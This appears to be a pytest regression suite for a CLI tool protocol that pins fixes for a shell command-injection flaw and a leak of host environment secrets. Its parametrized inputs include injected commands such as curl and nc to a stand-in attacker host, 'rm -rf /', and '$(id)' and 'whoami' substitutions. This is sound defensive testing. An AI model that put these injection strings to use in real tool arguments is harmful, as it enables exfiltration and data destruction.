"""Security tests for the CLI communication protocol.

Pin the fixes for:

- GHSA-33p6-5jxp-p3x4 (CWE-78, command injection via unsanitized
  `tool_args` interpolation in `_substitute_utcp_args`).
- GHSA-5v57-8rxj-3p2r (CWE-526, full host environment leaked to the
  CLI subprocess via `_prepare_environment`).

Each behavior is locked in here so a regression that re-introduces the
historical bypass fails this file rather than silently shipping.
"""
import os
import shlex
import sys
import tempfile

import pytest
import pytest_asyncio

from utcp_cli.cli_communication_protocol import CliCommunicationProtocol
from utcp_cli.cli_call_template import CliCallTemplate


@pytest_asyncio.fixture
async def transport() -> CliCommunicationProtocol:
    yield CliCommunicationProtocol()


# ---------------------------------------------------------------------------
# GHSA-33p6-5jxp-p3x4 — _substitute_utcp_args must shell-quote substituted
# values so attacker-controlled tool_args can't escape into the script.
# ---------------------------------------------------------------------------

class TestArgSubstitutionQuoting:
    @pytest.mark.parametrize(
        "value",
        [
            "data.csv; curl http://attacker.example",
            "data.csv && rm -rf /",
            "data.csv | nc attacker.example 9999",
            "data.csv `id`",
            "data.csv $(id)",
            'data.csv"; echo pwned; "',
            "data.csv\nrm -rf /",
            "value with spaces",
            "value'with'quote",
        ],
    )
    def test_shell_metacharacters_are_quoted(self, transport, value):
        substituted = transport._substitute_utcp_args(
            "echo UTCP_ARG_x_UTCP_END", {"x": value}
        )
        # The placeholder must be gone.
        assert "UTCP_ARG_x_UTCP_END" not in substituted
        # The original value must still be present (just quoted), so the
        # tool actually sees it.
        # On Unix shlex.quote may fully wrap in single quotes; on Windows we
        # wrap in single quotes and double internal `'`. Either way the
        # underlying characters appear somewhere in the substituted string.
        assert any(part in substituted for part in value.split("'"))

    def test_unix_quoting_uses_shlex(self, transport, monkeypatch):
        monkeypatch.setattr(os, "name", "posix")
        out = transport._substitute_utcp_args(
            "run UTCP_ARG_x_UTCP_END", {"x": "a; rm -rf /"}
        )
        # shlex.quote wraps anything containing shell metas in single quotes.
        assert out == f"run {shlex.quote('a; rm -rf /')}"
        assert "; rm -rf /" not in out.replace(shlex.quote("a; rm -rf /"), "")

    def test_windows_quoting_doubles_single_quote(self, transport, monkeypatch):
        monkeypatch.setattr(os, "name", "nt")
        out = transport._substitute_utcp_args(
            "Get-Item UTCP_ARG_x_UTCP_END",
            {"x": "C:\\Users\\bob's file.txt; whoami"},
        )
        # PowerShell single-quoted literal; embedded ' becomes ''.
        assert out == "Get-Item 'C:\\Users\\bob''s file.txt; whoami'"

    def test_windows_quoting_blocks_powershell_metacharacters(self, transport, monkeypatch):
        monkeypatch.setattr(os, "name", "nt")
        for payload in [
            "x; whoami",
            "x | whoami",
            "x & whoami",
            "x`whoami`",
            "x$(whoami)",
            "x\nwhoami",
        ]:
            out = transport._substitute_utcp_args(
                "Get-Item UTCP_ARG_x_UTCP_END", {"x": payload}
            )
            # The whole payload must be wrapped as a single-quoted literal.
            assert out.startswith("Get-Item '")
            assert out.endswith("'")
            # No unescaped single quote should appear in the middle.
            inner = out[len("Get-Item '"):-1]
            assert "'" not in inner.replace("''", "")

    def test_missing_arg_placeholder_is_also_quoted(self, transport, monkeypatch):
        # The fallback path used to return a bare `MISSING_ARG_<name>` token,
        # which broke the invariant that every substitution is one shell
        # token. Quote it for defense in depth.
        monkeypatch.setattr(os, "name", "posix")
        out = transport._substitute_utcp_args(
            "echo UTCP_ARG_missing_UTCP_END", {}
        )
        assert "UTCP_ARG_missing_UTCP_END" not in out
        # Either the literal token, or its shlex.quote'd form (alphanum +
        # underscores normally don't need quoting):
        assert "MISSING_ARG_missing" in out


# ---------------------------------------------------------------------------
# GHSA-5v57-8rxj-3p2r — _prepare_environment must NOT leak the full host
# environment into the CLI subprocess.
# ---------------------------------------------------------------------------

class TestPreparedEnvironmentDoesNotLeakSecrets:
    SECRET_KEYS = [
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_ACCESS_KEY_ID",
        "AZURE_CLIENT_SECRET",
        "GITHUB_TOKEN",
        "DATABASE_URL",
        "SLACK_TOKEN",
    ]

    def test_secrets_in_host_env_do_not_propagate(self, transport, monkeypatch):
        for k in self.SECRET_KEYS:
            monkeypatch.setenv(k, f"super-secret-{k}")
        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        for k in self.SECRET_KEYS:
            assert k not in env, (
                f"{k} leaked from host environment into CLI subprocess "
                "(GHSA-5v57-8rxj-3p2r). Only the safe-keys allowlist plus "
                "provider.env_vars should propagate."
            )

    def test_explicit_env_vars_are_preserved(self, transport, monkeypatch):
        # Caller can still inject extra env explicitly via env_vars, even
        # for keys that are otherwise blocked.
        monkeypatch.setenv("OPENAI_API_KEY", "host-value")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            env_vars={"OPENAI_API_KEY": "explicit-value", "MY_FLAG": "1"},
        )
        env = transport._prepare_environment(provider)
        assert env["OPENAI_API_KEY"] == "explicit-value"
        assert env["MY_FLAG"] == "1"

    def test_essentials_are_preserved(self, transport, monkeypatch):
        # PATH must propagate or no binary can be located.
        monkeypatch.setenv("PATH", "/usr/local/bin:/usr/bin:/bin")
        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        assert "PATH" in env

    def test_env_vars_override_safe_defaults(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            env_vars={"PATH": "/custom/bin"},
        )
        env = transport._prepare_environment(provider)
        assert env["PATH"] == "/custom/bin"

    def test_inherit_env_vars_passes_named_host_secrets(self, transport, monkeypatch):
        # Caller can opt specific host secrets into the subprocess by name
        # without copying their values into the call template.
        monkeypatch.setenv("OPENAI_API_KEY", "sk-from-host")
        monkeypatch.setenv("AWS_PROFILE", "prod")
        # NOT requested:
        monkeypatch.setenv("DATABASE_URL", "postgres://...")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["OPENAI_API_KEY", "AWS_PROFILE"],
        )
        env = transport._prepare_environment(provider)
        assert env["OPENAI_API_KEY"] == "sk-from-host"
        assert env["AWS_PROFILE"] == "prod"
        assert "DATABASE_URL" not in env

    def test_inherit_env_vars_skips_unset(self, transport, monkeypatch):
        monkeypatch.delenv("THIS_DOES_NOT_EXIST", raising=False)
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["THIS_DOES_NOT_EXIST"],
        )
        env = transport._prepare_environment(provider)
        assert "THIS_DOES_NOT_EXIST" not in env

    def test_env_vars_override_inherit_env_vars(self, transport, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "host-value")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["OPENAI_API_KEY"],
            env_vars={"OPENAI_API_KEY": "explicit-override"},
        )
        env = transport._prepare_environment(provider)
        assert env["OPENAI_API_KEY"] == "explicit-override"

    def test_inherit_env_vars_empty_list_is_strict_mode(self, transport, monkeypatch):
        # `inherit_env_vars=[]` means: nothing from host. Even PATH must
        # not leak through.
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/x")
        monkeypatch.setenv("OPENAI_API_KEY", "secret")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=[],
        )
        env = transport._prepare_environment(provider)
        assert env == {}

    def test_inherit_env_vars_empty_list_with_env_vars(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=[],
            env_vars={"FOO": "bar"},
        )
        env = transport._prepare_environment(provider)
        # Only env_vars; default allowlist is bypassed.
        assert env == {"FOO": "bar"}

    def test_inherit_env_vars_list_replaces_default_allowlist(self, transport, monkeypatch):
        # When the caller supplies a list, the default allowlist is NOT
        # merged in. They get exactly the names they asked for.
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/x")
        monkeypatch.setenv("OPENAI_API_KEY", "secret")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["OPENAI_API_KEY"],
        )
        env = transport._prepare_environment(provider)
        assert env == {"OPENAI_API_KEY": "secret"}

    def test_default_inherit_env_vars_includes_path_and_home(self, transport, monkeypatch):
        # `inherit_env_vars=None` (omitted) → default allowlist. PATH and
        # at least one platform-specific home directory variable should
        # be inherited so shells/binaries work.
        monkeypatch.setenv("PATH", "/usr/bin")
        if os.name == "nt":
            monkeypatch.setenv("USERPROFILE", "C:\\Users\\x")
            home_key = "USERPROFILE"
        else:
            monkeypatch.setenv("HOME", "/home/x")
            home_key = "HOME"

        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        assert env["PATH"] == "/usr/bin"
        assert home_key in env

    def test_default_inherit_env_vars_does_not_include_secrets(self, transport, monkeypatch):
        for k in self.SECRET_KEYS:
            monkeypatch.setenv(k, f"super-secret-{k}")
        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        for k in self.SECRET_KEYS:
            assert k not in env

    def test_explicit_none_matches_default(self, transport, monkeypatch):
        # Constructing with `inherit_env_vars=None` must produce the same
        # environment as omitting the field entirely — the
        # default-allowlist branch is keyed on `is None`, so don't let a
        # subtle change (e.g. switching the default to `[]`) silently
        # flip behavior.
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("OPENAI_API_KEY", "secret")

        omitted = CliCallTemplate(commands=[{"command": "echo hi"}])
        explicit_none = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=None,
        )
        assert (
            transport._prepare_environment(omitted)
            == transport._prepare_environment(explicit_none)
        )
        assert "PATH" in transport._prepare_environment(explicit_none)
        assert "OPENAI_API_KEY" not in transport._prepare_environment(explicit_none)

    def test_list_replaces_default_does_not_pull_in_other_defaults(
        self, transport, monkeypatch
    ):
        # Listing only PATH must not drag the rest of the default
        # allowlist along (HOME / USERPROFILE / LANG / etc.).
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/x")
        monkeypatch.setenv("USERPROFILE", "C:\\Users\\x")
        monkeypatch.setenv("LANG", "en_US.UTF-8")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["PATH"],
        )
        env = transport._prepare_environment(provider)
        assert env == {"PATH": "/usr/bin"}

    def test_duplicate_names_in_inherit_env_vars_are_idempotent(
        self, transport, monkeypatch
    ):
        monkeypatch.setenv("FOO", "1")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["FOO", "FOO", "FOO"],
        )
        env = transport._prepare_environment(provider)
        assert env == {"FOO": "1"}

    def test_unset_names_in_default_allowlist_are_skipped(
        self, transport, monkeypatch
    ):
        # If a key in the default allowlist is not set on the host, the
        # resulting env dict must simply omit it (not include `None` /
        # empty string / raise).
        for key in transport._default_inherited_keys():
            monkeypatch.delenv(key, raising=False)
        # Add just one so the dict isn't empty.
        monkeypatch.setenv("PATH", "/usr/bin")

        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        assert env == {"PATH": "/usr/bin"}
        # Specifically: never None values.
        for v in env.values():
            assert v is not None
            assert isinstance(v, str)


class TestInheritEnvVarsSerialization:
    """Pydantic round-trip: inherit_env_vars must preserve the
    None / [] / [...] distinction when a CliCallTemplate flows through
    the serializer (and thus through OpenAPI / JSON manuals).
    """

    def test_round_trip_preserves_none(self):
        from utcp_cli.cli_call_template import CliCallTemplateSerializer

        tpl = CliCallTemplate(commands=[{"command": "x"}])
        d = CliCallTemplateSerializer().to_dict(tpl)
        # Either omitted or explicitly null is acceptable, but it must
        # not silently become `[]`.
        assert d.get("inherit_env_vars", None) is None
        rebuilt = CliCallTemplateSerializer().validate_dict(d)
        assert rebuilt.inherit_env_vars is None

    def test_round_trip_preserves_empty_list(self):
        from utcp_cli.cli_call_template import CliCallTemplateSerializer

        tpl = CliCallTemplate(
            commands=[{"command": "x"}], inherit_env_vars=[]
        )
        d = CliCallTemplateSerializer().to_dict(tpl)
        assert d["inherit_env_vars"] == []
        rebuilt = CliCallTemplateSerializer().validate_dict(d)
        assert rebuilt.inherit_env_vars == []

    def test_round_trip_preserves_listed_names(self):
        from utcp_cli.cli_call_template import CliCallTemplateSerializer

        tpl = CliCallTemplate(
            commands=[{"command": "x"}],
            inherit_env_vars=["PATH", "OPENAI_API_KEY"],
        )
        d = CliCallTemplateSerializer().to_dict(tpl)
        assert d["inherit_env_vars"] == ["PATH", "OPENAI_API_KEY"]
        rebuilt = CliCallTemplateSerializer().validate_dict(d)
        assert rebuilt.inherit_env_vars == ["PATH", "OPENAI_API_KEY"]


# ---------------------------------------------------------------------------
# End-to-end: drive the real subprocess and confirm the injection payload
# does NOT escape its placeholder. Skipped on Windows because the mock
# script + bash assumptions don't apply identically.
# ---------------------------------------------------------------------------

@pytest.mark.skipif(os.name == "nt", reason="bash payload assumptions")
@pytest.mark.asyncio
async def test_no_command_injection_via_tool_args_unix(tmp_path):
    """Run the real shell pipeline with a malicious tool_arg and confirm
    the injected `touch` never runs.
    """
    transport = CliCommunicationProtocol()

    canary = tmp_path / "pwned"

    script = tmp_path / "echo_arg.py"
    script.write_text(
        "import sys\n"
        "print('arg:' + sys.argv[1])\n"
    )

    call_template = CliCallTemplate(
        commands=[
            {"command": f"{sys.executable} {script} UTCP_ARG_value_UTCP_END"}
        ]
    )

    payload = f"benign; touch {canary}"
    result = await transport.call_tool(
        None, "echo_arg", {"value": payload}, call_template
    )

    assert not canary.exists(), (
        "Command injection regression (GHSA-33p6-5jxp-p3x4): "
        "the `; touch` payload escaped the placeholder and ran."
    )
    # The script should have observed the literal payload.
    assert "benign; touch" in str(result)
